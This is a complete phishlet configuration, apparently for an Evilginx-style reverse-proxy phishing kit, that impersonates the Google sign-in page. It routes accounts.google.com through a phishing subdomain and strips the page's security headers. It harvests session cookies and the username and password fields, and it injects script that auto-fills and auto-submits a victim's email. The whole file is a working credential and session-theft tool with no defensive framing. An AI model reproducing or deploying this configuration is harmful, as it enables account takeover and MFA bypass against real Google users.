name: 'google'
min_ver: '3.0.0'
author: 'authflow'
description: 'Google login with auto-fill email capture'

proxy_hosts:
  - {phish_sub: 'SUB3_PLACEHOLDER', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
  - {phish_sub: 'SUB3_PLACEHOLDER', orig_sub: 'accounts.google.com', domain: 'google.com', session: true}

sub_filters:
  - {trg: 'accounts.google.com', orig: 'accounts.google.com', repl: 'SUB3_PLACEHOLDER.{hostname}'}
  - {trg: 'Content-Security-Policy', orig: '.*', repl: '', search: '.*', type: 'header'}
  - {trg: 'X-Frame-Options', orig: '.*', repl: '', search: '.*', type: 'header'}

auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID', 'OSID']

credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'Passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'accounts.google.com'
  path: '/v3/signin/identifier'

js_inject:
  - trigger: 'accounts.google.com'
    code: |
      (function() {
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get('email');
        if (email) {
          var emailField = document.querySelector('input[type="email"]') || document.querySelector('input[name="identifier"]');
          if (emailField) {
            emailField.value = email;
            emailField.dispatchEvent(new Event('input', { bubbles: true }));
            var form = emailField.closest('form');
            if (form) {
              setTimeout(function() { form.dispatchEvent(new Event('submit', { bubbles: true })); }, 500);
            }
          }
        }
      })();